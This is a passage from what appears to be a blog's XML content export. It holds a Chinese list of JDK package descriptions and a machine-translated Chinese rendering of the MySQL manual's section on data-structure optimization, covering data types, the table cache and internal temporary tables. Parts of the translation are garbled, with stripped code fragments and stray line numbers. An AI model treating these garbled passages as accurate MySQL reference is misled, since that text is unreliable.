类的小工具包，支持在单个变量上解除锁的线程安全编程。 java.util.concurrent.locks 为锁和等待条件提供一个框架的接口和类，它不同于内置同步和监视器。 java.util.jar 提供读写 JAR (Java ARchive) 文件格式的类，该格式基于具有可选清单文件的标准 ZIP 文件格式。 java.util.logging 提供 JavaTM 2 平台核心日志工具的类和接口。 java.util.prefs 此包允许应用程序存储并获取用户和系统首选项和配置数据。 java.util.regex 用于匹配字符序列与正则表达式指定模式的类。 java.util.spi java.util 包中类的服务提供者类。 java.util.zip 提供用于读写标准 ZIP 和 GZIP 文件格式的类。 javax.accessibility 定义了用户界面组件与提供对这些组件进行访问的辅助技术之间的协定。 javax.crypto 为加密操作提供类和接口。 javax.crypto.interfaces 根据 RSA Laboratories&apos; PKCS #3 的定义，提供 Diffie-Hellman 密钥接口。 javax.crypto.spec 为密钥规范和算法参数规范提供类和接口。 javax.imageio Java Image I/O API 的主要包。 javax.imageio.event Java Image I/O API 的一个包，用于在读取和写入图像期间处理事件的同步通知。 javax.imageio.metadata 用于处理读写元数据的 Java Image I/O API 的包。 javax.imageio.plugins.bmp 包含供内置 BMP 插件使用的公共类的包。 javax.imageio.plugins.jpeg 支持内置 JPEG 插件的类。 javax.imageio.spi 包含用于 reader、writer、transcoder 和流的插件接口以及一个运行时注册表的 Java Image I/O API 包。 javax.imageio.stream Java Image I/O API 的一个包，用来处理从文件和流中产生的低级别 I/O。 javax.management 提供 Java Management Extensions 的核心类。 javax.management.loading 提供实现高级动态加载的类。 javax.management.modelmbean 提供了 ModelMBean 类的定义。 javax.management.monitor 提供 monitor 类的定义。 javax.management.openmbean 提供开放数据类型和 Open MBean 描述符类。 javax.management.relation 提供 Relation Service 的定义。 javax.management.remote 对 JMX MBean 服务器进行远程访问使用的接口。 javax.management.remote.rmi RMI 连接器是供 JMX Remote API 使用的一种连接器，后者使用 RMI 将客户端请求传输到远程 MBean 服务器。 javax.management.timer 提供对 Timer MBean（计时器 MBean）的定义。 javax.naming 为访问命名服务提供类和接口。 javax.naming.directory 扩展 javax.naming 包以提供访问目录服务的功能。 javax.naming.event 在访问命名和目录服务时提供对事件通知的支持。 javax.naming.ldap 提供对 LDAPv3 扩展操作和控件的支持。 javax.naming.spi 提供一些方法来动态地插入对通过 javax.naming 和相关包访问命名和目录服务的支持。 javax.net 提供用于网络应用程序的类。 javax.net.ssl 提供用于安全套接字包的类。 javax.print 为 JavaTM Print Service API 提供了主要类和接口。 javax.print.attribute 提供了描述 JavaTM Print Service 属性的类型以及如何分类这些属性的类和接口。 javax.print.attribute.standard 包 javax.print.attribute.standard 包括特定打印属性的类。 javax.print.event 包 javax.print.event 包含事件类和侦听器接口。 javax.rmi 包含 RMI-IIOP 的用户 API。 javax.rmi.CORBA 包含用于 RMI-IIOP 的可移植性 API。 javax.rmi.ssl 通过安全套接字层 (SSL) 或传输层安全 (TLS) 协议提供 RMIClientSocketFactory 和 RMIServerSocketFactory 的实现。 javax.security.auth 此包提供用于进行验证和授权的框架。 javax.security.auth.callback 此包提供与应用程序进行交互所必需的类，以便检索信息（例如，包括用户名和密码的验证数据）或显示信息（例如，错误和警告消息）。 javax.security.auth.kerberos 此包包含与 Kerberos 网络验证协议相关的实用工具类。 javax.security.auth.login 此包提供可插入的验证框架。 javax.security.auth.spi 此包提供用于实现可插入验证模块的接口。 javax.security.auth.x500 此包包含应该用来在 Subject 中存储 X500 Principal 和 X500 Private Crendentials 的类。 javax.security.cert 为公钥证书提供类。 javax.security.sasl 包含用于支持 SASL 的类和接口。 javax.sound.midi 提供用于 MIDI（音乐乐器数字接口）数据的 I/O、序列化和合成的接口和类。 javax.sound.midi.spi 在提供新的 MIDI 设备、MIDI 文件 reader 和 writer、或音库 reader 时提供服务提供者要实现的接口。 javax.sound.sampled 提供用于捕获、处理和回放取样的音频数据的接口和类。 javax.sound.sampled.spi 在提供新音频设备、声音文件 reader 和 writer，或音频格式转换器时，提供将为其创建子类的服务提供者的抽象类。 javax.sql 为通过 JavaTM 编程语言进行服务器端数据源访问和处理提供 API。 javax.sql.rowset JDBC RowSet 实现的标准接口和基类。 javax.sql.rowset.serial 提供实用工具类，允许 SQL 类型与 Java 编程语言数据类型之间的可序列化映射关系。 javax.sql.rowset.spi 第三方供应商在其同步提供者的实现中必须使用的标准类和接口。 javax.swing 提供一组“轻量级”（全部是 Java 语言）组件，尽量让这些组件在所有平台上的工作方式都相同。 javax.swing.border 提供围绕 Swing 组件绘制特殊边框的类和接口。 javax.swing.colorchooser 包含供 JColorChooser 组件使用的类和接口。 javax.swing.event 供 Swing 组件触发的事件使用。 javax.swing.filechooser 包含 JFileChooser 组件使用的类和接口。 javax.swing.plaf 提供一个接口和许多抽象类，Swing 用它们来提供自己的可插入外观功能。 javax.swing.plaf.basic 提供了根据基本外观构建的用户界面对象。 javax.swing.plaf.metal 提供根据 Java 外观（曾经代称为 Metal）构建的用户界面对象，Java 外观是默认外观。 javax.swing.plaf.multi 提供了组合两个或多个外观的用户界面对象。 javax.swing.plaf.synth Synth 是一个可更换皮肤 (skinnable) 的外观，在其中可委托所有绘制。 javax.swing.table 提供用于处理 javax.swing.JTable 的类和接口。 javax.swing.text 提供类 HTMLEditorKit 和创建 HTML 文本编辑器的支持类。 javax.swing.text.html 提供类 HTMLEditorKit 和创建 HTML 文本编辑器的支持类。 javax.swing.text.html.parser 提供默认的 HTML 解析器以及支持类。 javax.swing.text.rtf 提供一个类 (RTFEditorKit)，用于创建富文本格式（Rich-Text-Format）的文本编辑器。 javax.swing.tree 提供处理 javax.swing.JTree 的类和接口。 javax.swing.undo 允许开发人员为应用程序（例如文本编辑器）中的撤消/恢复提供支持。 javax.transaction 包含解组期间通过 ORB 机制抛出的三个异常。 javax.transaction.xa 提供定义事务管理器和资源管理器之间的协定的 API，它允许事务管理器添加或删除 JTA 事务中的资源对象（由资源管理器驱动程序提供）。 javax.xml 根据 XML 规范定义核心 XML 常量和功能。 javax.xml.bind 为包含解组、编组和验证功能的客户端应用程序提供运行时绑定框架。 javax.xml.bind.annotation 定义将 Java 程序元素定制成 XML 模式映射的注释。 javax.xml.bind.annotation.adapters XmlAdapter 及其规范定义的子类允许任意 Java 类与 JAXB 一起使用。 javax.xml.bind.attachment 此包由基于 MIME 的包处理器实现，该处理器能够解释并创建基于 MIME 的包格式的已优化的二进制数据。 javax.xml.bind.helpers 仅由 JAXB 提供者用于： 提供某些 javax.xml.bind 接口的部分默认实现。 javax.xml.bind.util 有用的客户端实用工具类。 javax.xml.crypto 用于 XML 加密的通用类。 javax.xml.crypto.dom javax.xml.crypto 包的特定于 DOM 的类。 javax.xml.crypto.dsig 用于生成和验证 XML 数字签名的类。 javax.xml.crypto.dsig.dom javax.xml.crypto.dsig 包特定于 DOM 的类。 javax.xml.crypto.dsig.keyinfo 用来解析和处理 KeyInfo 元素和结构的类。 javax.xml.crypto.dsig.spec XML 数字签名的参数类。 javax.xml.datatype XML/Java 类型映射关系。 javax.xml.namespace XML 名称空间处理。 javax.xml.parsers 提供允许处理 XML 文档的类。 javax.xml.soap 提供用于创建和构建 SOAP 消息的 API。 javax.xml.stream javax.xml.stream.events javax.xml.stream.util javax.xml.transform 此包定义了用于处理转换指令，以及执行从源到结果的转换的一般 API。 javax.xml.transform.dom 此包实现特定于 DOM 的转换 API。 javax.xml.transform.sax 此包实现特定于 SAX2 的转换 API。 javax.xml.transform.stax 提供特定于 StAX 的转换 API。 javax.xml.transform.stream 此包实现特定于流和 URI 的转换 API。 javax.xml.validation 此包提供了用于 XML 文档验证的 API。 javax.xml.ws 此包包含核心 JAX-WS API。 javax.xml.ws.handler 该包定义用于消息处理程序的 API。 javax.xml.ws.handler.soap 该包定义用于 SOAP 消息处理程序的 API。 javax.xml.ws.http 该包定义特定于 HTTP 绑定的 API。 javax.xml.ws.soap 该包定义特定于 SOAP 绑定的 API。 javax.xml.ws.spi 该包定义用于 JAX-WS 2.0 的 SPI。 javax.xml.xpath 此包提供了用于 XPath 表达式的计算和访问计算环境的 object-model neutral API。 org.ietf.jgss 此包提供一个框架，该框架允许应用程序开发人员通过利用统一的 API 使用一些来自各种基础安全机制（如 Kerberos）的安全服务，如验证、数据完整性和和数据机密性。 org.omg.CORBA 提供 OMG CORBA API 到 JavaTM 编程语言的映射，包括 ORB 类，如果已实现该类，则程序员可以使用此类作为全功能对象请求代理（Object Request Broker，ORB）。 org.omg.CORBA_2_3 CORBA_2_3 包定义对 Java[tm] Standard Edition 6 中现有 CORBA 接口所进行的添加。 org.omg.CORBA_2_3.portable 提供输入和输出值类型的各种方法，并包含 org/omg/CORBA/portable 包的其他更新。 org.omg.CORBA.DynAnyPackage 提供与 DynAny 接口一起使用的异常（InvalidValue、Invalid、InvalidSeq 和 TypeMismatch）。 org.omg.CORBA.ORBPackage 提供由 ORB.resolve_initial_references 方法抛出的异常 InvalidName，以及由 ORB 类中的动态 Any 创建方法抛出的异常 InconsistentTypeCode。 org.omg.CORBA.portable 提供可移植性层，即可以使一个供应商生成的代码运行在另一个供应商 ORB 上的 ORB API 集合。 org.omg.CORBA.TypeCodePackage 提供用户定义的异常 BadKind 和 Bounds，它们将由 TypeCode 类中的方法抛出。 org.omg.CosNaming 为 Java IDL 提供命名服务。 org.omg.CosNaming.NamingContextExtPackage 此包包含以下在 org.omg.CosNaming.NamingContextExt 中使用的类： AddressHelper StringNameHelper URLStringHelper InvalidAddress 包规范 有关 Java[tm] Platform, Standard Edition 6 ORB 遵守的官方规范的受支持部分的明确列表，请参阅 Official Specifications for CORBA support in Java[tm] SE 6。 org.omg.CosNaming.NamingContextPackage 此包包含 org.omg.CosNaming 包的 Exception 类。 org.omg.Dynamic 此包包含 OMG Portable Interceptor 规范。 org.omg.DynamicAny 提供一些类和接口使得在运行时能够遍历与 any 有关联的数据值，并提取数据值的基本成分。 org.omg.DynamicAny.DynAnyFactoryPackage 此包包含 DynamicAny 模块的 DynAnyFactory 接口中的类和异常，该模块在 OMG The Common Object Request Broker: Architecture and Specification 。 org.omg.DynamicAny.DynAnyPackage 此包包含 DynAny 模块的 DynAnyFactory 接口中的类和异常，该模块在 OMG The Common Object Request Broker: Architecture and Specification 。 org.omg.IOP 此包包含在 OMG 文档 The Common Object Request Broker: Architecture and Specification 。org.omg.IOP.CodecFactoryPackage 此包包含 IOP::CodeFactory 接口中指定的异常（作为 Portable Interceptor 规范的一部分）。 org.omg.IOP.CodecPackage 此包根据 IOP::Codec IDL 接口定义生成。 org.omg.Messaging 此包包含 OMG Messaging Interceptor 规范 。 org.omg.PortableInterceptor 提供一个注册 ORB 钩子 (hook) 的机制，通过这些钩子 ORB 服务可以截取执行 ORB 的正常流。 org.omg.PortableInterceptor.ORBInitInfoPackage 此包包含 OMG Portable Interceptor 规范 。org.omg.PortableServer 提供一些类和接口，用来生成跨多个供应商 ORB 的可移植应用程序的服务器端。 org.omg.PortableServer.CurrentPackage 提供各种方法实现，这些实现能够访问调用方法的对象的身份。 org.omg.PortableServer.POAManagerPackage 封装 POA 关联的处理状态。 org.omg.PortableServer.POAPackage 允许程序员构造可在不同 ORB 产品间移植的对象实现。 org.omg.PortableServer.portable 提供一些类和接口，用来生成跨多个供应商 ORB 的可移植应用程序的服务器端。 org.omg.PortableServer.ServantLocatorPackage 提供定位 servant 的类和接口。 org.omg.SendingContext 为值类型的编组提供支持。 org.omg.stub.java.rmi 包含用于 java.rmi 包中出现的 Remote 类型的 RMI-IIOP Stub。 org.w3c.dom 为文档对象模型 (DOM) 提供接口，该模型是 Java API for XML Processing 的组件 API。 org.w3c.dom.bootstrap org.w3c.dom.events org.w3c.dom.ls org.xml.sax 此包提供了核心 SAX API。 org.xml.sax.ext 此包包含适合的 SAX 驱动程序不一定支持的 SAX2 设施的接口。 org.xml.sax.helpers 此包包含“帮助器”类，其中包括对引导基于 SAX 的应用程序的支持。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【数据结构】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-data-structure%2F</url>
    <content type="text"><![CDATA[在作为数据库设计师的角色中，寻找组织模式，表和列的最有效方式。与调整应用程序代码时一样，您可以最大限度地减少I / O，将相关项目集中在一起，并提前进行计划，以便随着数据量的增加性能保持在较高水平 从高效的数据库设计开始，团队成员可以更轻松地编写高性能的应用程序代码，并使数据库可以随应用程序的演变和重写而持续下去。 8.4.1优化数据大小123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103设计您的表格以尽量减少磁盘空间。这可以通过减少写入和读取磁盘的数据量来实现巨大的改进。在查询执行期间，较小的表格通常需要较少的主存储器，而其内容正在被主动处理。表数据的任何空间减少也会导致可以更快处理的更小的索引。MySQL支持许多不同的存储引擎（表格类型）和行格式。对于每个表格，您可以决定使用哪种存储和索引方法。为您的应用程序选择适当的表格格式可以为您带来巨大的性能提升。请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。通过使用此处列出的技术，您可以获得更好的表格性能并最小化存储空间：表列行格式索引加盟正常化表列尽可能使用最有效（最小）的数据类型。MySQL有很多专门的类型可以节省磁盘空间和内存。例如，如果可能的话，使用较小的整数类型来获得较小的表格。 MEDIUMINT通常是一个更好的选择，INT因为一 MEDIUMINT列使用的空间减少了25％。NOT NULL如果可能的话， 声明列。通过更好地使用索引并消除测试每个值是否存在开销，它使SQL操作更快NULL。您还可以节省一些存储空间，每列一位。如果您真的需要NULL表格中的值，请使用它们。只需避免允许NULL每列中的值的默认设置 。行格式InnoDB表格DYNAMIC默认使用行格式创建 。要在a 或语句中明确使用除了DYNAMIC，配置 innodb_default_row_format或指定ROW_FORMAT选项以外的行格式。 CREATE TABLEALTER TABLE行格式的紧凑系列，其中包括 COMPACT，DYNAMIC和COMPRESSED，以减少某些操作的CPU使用为代价来减少行存储空间。如果您的工作负载是受缓存命中率和磁盘速度限制的典型负载，则可能会更快。如果这是一个受CPU速度限制的罕见情况，则可能会变慢。紧凑的行格式系列还可以CHAR在使用诸如utf8mb3或的可变长度字符集时优化 列存储 utf8mb4。使用ROW_FORMAT=REDUNDANT， 占用字符集的最大字节长度×。许多语言主要使用单字节字符编写 ，因此固定的存储长度通常会浪费空间。使用紧凑的行格式系列，可在to 范围内分配可变数量的存储空间 CHAR(N)Nutf8InnoDBNN×通过去除尾部空格来为这些列设置字符集的最大字节长度。最小存储长度为 N字节，便于在典型情况下进行就地更新。有关更多信息，请参见 第14.8.1.2节“InnoDB表的物理行结构”。要通过以压缩形式存储表数据来进一步减少空间，请ROW_FORMAT=COMPRESSED在创建InnoDB表时 指定 ，或在现有表上运行 myisampack命令 MyISAM。（InnoDB压缩表是可读可写的，而MyISAM压缩表是只读的。）对于MyISAM表中，如果没有任何可变长度列（VARCHAR， TEXT，或 BLOB列），一个固定大小的行格式被使用。这会更快，但可能会浪费一些空间。请参见第15.2.3节“MyISAM表格存储格式”。即使VARCHAR列中包含CREATE TABLE选项 ，您也可以提示您想要固定长度的行ROW_FORMAT=FIXED。索引表格的主要索引应尽可能短。这使得每一行的识别简单且高效。对于InnoDB表，主键列在每个二级索引条目中都是重复的，所以如果有很多二级索引，则较短的主键会节省相当多的空间。只创建您需要提高查询性能的索引。索引很适合检索，但会减慢插入和更新操作。如果您主要通过在列组合上搜索来访问表，请在其上创建一个合成索引，而不是每个列的单独索引。指数的第一部分应该是最常用的列。如果从表格中选择时总是使用多列，则索引中的第一列应该是重复次数最多的列，以便更好地压缩索引。如果长字符串列很可能在第一个字符数上有一个唯一的前缀，那么最好只索引这个前缀，使用MySQL支持在列的最左边部分创建一个索引（请参见第13.1.14节，“CREATE INDEX Syntax”）。更短的索引速度更快，不仅因为它们需要更少的磁盘空间，还因为它们还会在索引缓存中为您提供更多的点击量，因此磁盘搜索量更少。请参见 第5.1.1节“配置服务器”。加盟在某些情况下，分割成两个经常扫描的表格可能是有益的。如果它是一个动态格式的表格，并且可以使用一个较小的静态格式表格来扫描表格时可以用来查找相关的行，那么情况尤其如此。在具有相同数据类型的不同表中使用相同信息声明列，以根据相应列加快联接。保持列名简单，以便您可以在不同的表中使用相同的名称并简化连接查询。例如，在一个名为table的表中customer，使用一个列名来name代替 customer_name。为了让您的名字可移植到其他SQL服务器，请考虑将它们保持为少于18个字符。正常化通常，尽量保持所有数据不冗余（观察数据库理论中提到的 第三范式）。不必重复诸如名称和地址之类的冗长值，而是为它们分配唯一的ID，根据需要在多个较小的表中重复这些ID，并通过引用join子句中的ID来加入查询中的表。如果速度比磁盘空间更重要以及保留多个数据副本的维护成本（例如，在分析大型表中的所有数据的商业智能场景中），则可以放宽规范化规则，复制信息或创建汇总表以获得更多速度。 8.4.2优化MySQL数据类型8.4.2.1优化数字数据8.4.2.2优化字符和字符串类型8.4.2.3优化BLOB类型8.4.2.4使用PROCEDURE ANALYZE8.4.2.1优化数字数据1234567对于可以表示为字符串或数字的唯一ID或其他值，首选数字列来对字符串进行字符串。由于较大的数值可以以比相应的字符串更少的字节存储，因此速度更快，并且需要更少的内存来传输和比较它们。如果您使用的是数字数据，在许多情况下访问数据库（使用实时连接）的信息比访问文本文件要快。数据库中的信息可能以比文本文件更紧凑的格式存储，因此访问它涉及更少的磁盘访问。您还可以将代码保存在应用程序中，因为您可以避免解析文本文件以查找行和列边界。 8.4.2.2优化字符和字符串类型123456789101112131415161718192021222324对于字符和字符串列，请遵循以下准则：如果不需要特定于语言的归类功能，请使用二进制归类顺序进行快速比较和排序操作。您可以使用 BINARY操作员在特定查询中使用二进制排序规则。在比较不同列的值时，尽可能使用相同的字符集和归类来声明这些列，以避免在运行查询时进行字符串转换。对于小于8KB大小的列值，请使用二进制 VARCHAR代替 BLOB。该GROUP BY 和ORDER BY条款可以生成临时表，这些临时表可以使用的 MEMORY存储引擎，如果原来的表不包含任何BLOB 列。如果一个表包含字符串列（如名称和地址），但许多查询不检索这些列，请考虑将字符串列拆分为单独的表，并在必要时使用具有外键的连接查询。当MySQL从一行中检索任何值时，它会读取一个包含该行所有列（可能还有其他相邻行）的数据块。保持每行较小，只有最常用的列，允许更多的行适合每个数据块。这些紧凑的表格减少了常见查询的磁盘I / O和内存使用量。在表中使用随机生成的值作为主键InnoDB时，如果可能，请使用升序值（如当前日期和时间）作为前缀。当连续的主值被物理地存储在彼此附近时，InnoDB可以更快地插入和检索它们。有关数字列通常比等效字符串列更可取的原因，请参见第8.4.2.1节“针对数字数据优化”。 8.4.2.3优化BLOB类型123456789101112131415161718存储包含文本数据的大块时，请考虑先压缩它。当整个表被压缩，则不能使用这种技术 InnoDB或MyISAM。对于包含多个列的表，为了减少不使用BLOB列的查询的内存要求，请考虑将BLOB列拆分为单独的表，并在需要时使用连接查询引用它。由于检索和显示BLOB值的性能要求可能与其他数据类型有很大的不同，因此可以将BLOB特定的表放在不同的存储设备上，甚至是单独的数据库实例中。例如，要检索BLOB可能需要大量的顺序磁盘读取，这比较适合传统硬盘驱动器而非 SSD设备。有关二进制列有时比等效BLOB列更可取的原因，请参见第8.4.2.2节“优化字符和字符串类型”VARCHAR。您可以将列值的散列存储在单独的列中，对该列进行索引并在查询中测试散列值，而不是针对非常长的文本字符串测试相等性。（使用MD5()或 CRC32()函数来生成散列值。）由于散列函数可能会为不同的输入产生重复结果，因此您仍然在查询中包含一个子句 以防止错误匹配; 性能优势来自散列值的更小，易于扫描的索引。 AND blob_column = long_string_value 8.4.2.4使用PROCEDURE ANALYZE1234567891011121314151617181920212223242526272829303132333435ANALYSE([max_elements[,max_memory]])注意PROCEDURE ANALYSE() 从MySQL 5.7.18开始已弃用，并在MySQL 8.0中删除。ANALYSE()检查查询的结果并返回结果分析，为每列提供最佳数据类型，这可能有助于减小表格大小。要获得此分析，请附加PROCEDURE ANALYSE到SELECT声明的结尾处 ：SELECT ... FROM ... WHERE ... PROCEDURE ANALYZE（[ max_elements，[ max_memory]]）例如：SELECT col1，col2 FROM table1 PROCEDURE ANALYZE（10，2000）;结果显示查询返回值的一些统计信息，并为列提出最佳数据类型。这对于检查现有表格或导入新数据后可能会有所帮助。您可能需要为参数尝试不同的设置，以便在PROCEDURE ANALYSE()不适ENUM当时不会显示 数据类型。参数是可选的，使用如下：max_elements（默认值为256）是ANALYSE()每列通知的最大不同值的数量 。这用于ANALYSE()检查最佳数据类型是否应该是类型的 ENUM; 如果有多个max_elements不同的值，则ENUM不是建议的类型。max_memory（默认8192）是ANALYSE()在尝试查找所有不同值时应分配每列的最大内存量 。一个PROCEDURE条款是不是在允许的 UNION声明。8.4.3优化许多表8.4.3.1 MySQL如何打开和关闭表格8.4.3.2在同一数据库中创建多个表的缺点一些快速保存单个查询的技术涉及将数据分割到多个表中。当表的数量达到数千甚至数百万时，处理所有这些表的开销成为新的性能考虑因素。 8.4.3.1 MySQL如何打开和关闭表格123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687当你执行mysqladmin status 命令时，你应该看到如下所示的内容：正常运行时间：426正在运行的线程：1问题：11082重新加载：1打开表格：12Open tables如果你只有六张桌子，12 的价值可能会有点令人费解。MySQL是多线程的，因此可能有很多客户端同时为给定的表发出查询。为了尽量减少多个客户端会话在同一个表上具有不同状态的问题，该表由每个并发会话独立打开。这使用额外的内存，但通常会提高性能。使用MyISAM表格，打开表格的每个客户端的数据文件都需要一个额外的文件描述符。（相比之下，索引文件描述符在所有会话之间共享。）该table_open_cache和 max_connections系统变量影响服务器保持打开的文件的最大数量。如果您增加这些值中的一个或两个，则可能会遇到操作系统对每个进程打开的文件描述符数量施加的限制。许多操作系统允许您增加打开文件的限制，但方法在系统之间差别很大。请查阅您的操作系统文档以确定是否可以增加限制以及如何这样做。table_open_cache与...有关max_connections。例如，对于200个并发运行连接，请至少指定一个表缓存大小，其中 是您执行的任何查询中每个连接的最大表数量。您还必须为临时表和文件保留一些额外的文件描述符。 200 * NN确保您的操作系统可以处理table_open_cache设置隐含的打开文件描述符的数量 。如果 table_open_cache设置得太高，MySQL可能会耗尽文件描述符并拒绝连接，无法执行查询，并且非常不可靠。您还应该考虑到MyISAM存储引擎对于每个独特的打开表格需要两个文件描述符的事实 。对于分区 MyISAM表，打开的表的每个分区都需要两个文件描述符。（还要注意，当MyISAM打开一个分区表时，它会打开这个表的每个分区，不管是否实际使用了一个给定的分区，参见 MyISAM和分区文件描述符的用法。）可以使用 --open-files-limit启动选项到mysqld。参见 第B.5.2.17节“找不到文件和类似的错误”。打开表格的缓存保存在table_open_cache条目级别 。服务器在启动时自动调整缓存大小。要明确设置大小，请table_open_cache在启动时设置 系统变量。请注意，MySQL可能暂时打开更多的表来执行查询。在下列情况下，MySQL会关闭一个未使用的表并将其从表缓存中删除：当缓存已满并且线程尝试打开不在缓存中的表时。当缓存包含多个table_open_cache条目并且缓存中 的表不再被任何线程使用时。表冲洗操作发生时。当有人发出FLUSH TABLES语句或执行 mysqladmin flush-tables或 mysqladmin refresh命令时会发生这种情况。当表缓存填满时，服务器使用以下过程来查找要使用的缓存条目：当前未使用的表格被释放，从最近使用的表格开始。如果需要打开新表，但缓存已满并且没有表可以释放，则缓存将根据需要暂时扩展。当缓存处于临时扩展状态并且表从已使用状态变为未使用状态时，表将关闭并从缓存中释放。MyISAM为每个并发访问打开 一个表。这意味着如果两个线程访问同一个表，或者一个线程在同一个查询中访问了两次表（例如，通过将表连接到它自己），则需要打开两次表。每个并发打开需要表缓存中的条目。任何MyISAM表的第一次打开 需要两个文件描述符：一个用于数据文件，一个用于索引文件。该表的每次额外使用仅为数据文件提供一个文件描述符。索引文件描述符在所有线程之间共享。如果您正在使用该语句打开一个表，则会为该线程分配一个专用表对象。此表对象不被其他线程共享，并且在线程调用或线程终止之前不会关闭。发生这种情况时，该表将放回表缓存中（如果缓存未满）。请参见 第13.2.4节“HANDLER语法”。 HANDLER tbl_name OPENHANDLER tbl_name CLOSE您可以通过检查mysqld状态变量来确定表缓存是否过小，该变量 Opened_tables指示自服务器启动以来的表开放操作数：MySQL的&gt; SHOW GLOBAL STATUS LIKE &apos;Opened_tables&apos;;+ --------------- + ------- +| 变量名| 值|+ --------------- + ------- +| Opened_tables | 2741 |+ --------------- + ------- +如果该值非常大或快速增加，即使您没有发出很多FLUSH TABLES语句，也要增加表缓存大小。请参见第5.1.7节“服务器系统变量”和 第5.1.9节“服务器状态变量”。 8.4.3.2在同一数据库中创建多个表的缺点123如果MyISAM在同一数据库目录中有多个表，则打开，关闭和创建操作会很慢。如果您SELECT 在许多不同的表上执行语句，那么当表缓存满时会有一些开销，因为对于每个必须打开的表，必须关闭另一个表。您可以通过增加表缓存中允许的条目数来减少此开销。 8.4.4在MySQL中使用内部临时表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273在某些情况下，服务器在处理语句时创建内部临时表。用户无法直接控制何时发生。服务器在如下条件下创建临时表：对UNION 报表的评估，稍后会有一些例外情况。评估一些视图，例如那些使用TEMPTABLE算法 UNION或聚合的视图 。派生表的评估（见 第13.2.10.8节“派生表”）。为子查询或半连接实现创建的表（请参见第8.2.2节“优化子查询，派生表和视图引用”）。评估包含一个ORDER BY子句和一个不同GROUP BY子句的语句，ORDER BY或者GROUP BY包含来自除连接队列中的第一个表以外的表的列或包含该列的语句。DISTINCT结合 评估ORDER BY可能需要临时表。对于使用SQL_SMALL_RESULT 修饰符的查询，MySQL使用内存中的临时表，除非查询还包含需要磁盘存储的元素（稍后介绍）。为了评估 INSERT ... SELECT从同一个表中选择并插入到同一个表中的语句，MySQL创建一个内部临时表来存放来自该表的行 SELECT，然后将这些行插入到目标表中。请参见 第13.2.5.1节“INSERT ... SELECT语法”。评估多表 UPDATE报表。评估GROUP_CONCAT() 或COUNT(DISTINCT) 表达。要确定某个语句是否需要临时表，请使用 EXPLAIN并检查该 Extra列以查看它是否显示 Using temporary（请参见 第8.8.1节“使用EXPLAIN优化查询”）。对于派生或物化临时表格EXPLAIN 不一定会说Using temporary。当服务器创建内部临时表（无论是在内存中还是在磁盘上）时，它都会增加 Created_tmp_tables状态变量。如果服务器在磁盘上创建表（最初或通过转换内存表），它将增加 Created_tmp_disk_tables状态变量。某些查询条件会阻止使用内存中的临时表，在这种情况下，服务器会使用磁盘上的表：表中存在一列BLOB或一 TEXT列。这包括具有字符串值的用户定义变量，因为它们被视为 BLOB或 TEXT列，这取决于它们的值分别是二进制还是非二进制字符串。SELECT如果使用UNION或 UNION ALL 使用列表中 最大长度大于512（二进制字符串的字节，非二进制字符串的字符）的任何字符串列。的SHOW COLUMNS和 DESCRIBE语句中使用 BLOB作为用于某些列的类型，从而用于结果的临时表是磁盘上的表。服务器不会为UNION符合某些资格的语句使用临时表 。相反，它从临时表创建中仅保留执行结果列类型转换所需的数据结构。该表没有完全实例化，没有行被写入或读取; 行直接发送到客户端。结果是内存和磁盘需求减少，第一行发送到客户端之前的延迟更小，因为服务器不需要等到最后一个查询块被执行。EXPLAIN而优化器跟踪输出反映了这种执行策略： UNION RESULT 查询块不存在，因为该块对应于从临时表读取的部分。这些条件有资格在UNION没有临时表的情况下进行评估：工会是UNION ALL，不是 UNION或UNION DISTINCT。没有全球ORDER BY条款。联合不是&#123;INSERT | REPLACE&#125; ... SELECT ... 语句的顶级查询块 。 内部临时表存储引擎1234567891011121314151617181920212223242526272829内部临时表可以在内存中保持并且由处理MEMORY存储引擎，或者由存储在磁盘上InnoDB或 MyISAM存储引擎。如果内部临时表被创建为内存表，但变得太大，MySQL会自动将其转换为磁盘上的表。内存中临时表的最大大小取决于哪个值tmp_table_size和 max_heap_table_size更小值 。这与MEMORY显式创建的表有所不同CREATE TABLE：对于这些表，只有 max_heap_table_size系统变量决定允许表增长多少，并且没有转换为磁盘格式。所述 internal_tmp_disk_storage_engine 系统变量确定哪个存储引擎服务器使用来管理的磁盘上的内部临时表。允许的值是INNODB（默认值）和 MYISAM。注意使用时 internal_tmp_disk_storage_engine=INNODB，生成超出InnoDB 行或列限制的磁盘内部临时表的查询 将返回行大小过大或列 错误过多。解决方法是设置 internal_tmp_disk_storage_engine 为MYISAM。内部临时表格存储格式内存中的临时表由MEMORY存储引擎管理，该 引擎使用固定长度的行格式。VARCHAR并且 VARBINARY列值被填充到最大列长度，实际上将它们存储为 CHAR和BINARY列。在磁盘上的临时表由管理 InnoDB或MyISAM存储引擎（取决于 internal_tmp_disk_storage_engine 设置）。两个引擎都使用动态宽度行格式存储临时表。列只根据需​​要获取尽可能多的存储空间，与使用固定长度行的磁盘表相比，它减少了磁盘I / O和空间要求以及处理时间。对于最初在内存中创建内部临时表的语句，然后将其转换为磁盘上表，通过跳过转换步骤并在磁盘上创建表开始，可以获得更好的性能。所述 big_tables系统变量可以用来迫使内部临时表的磁盘存储。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【查询器优化·一】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-selector-1%2F</url>
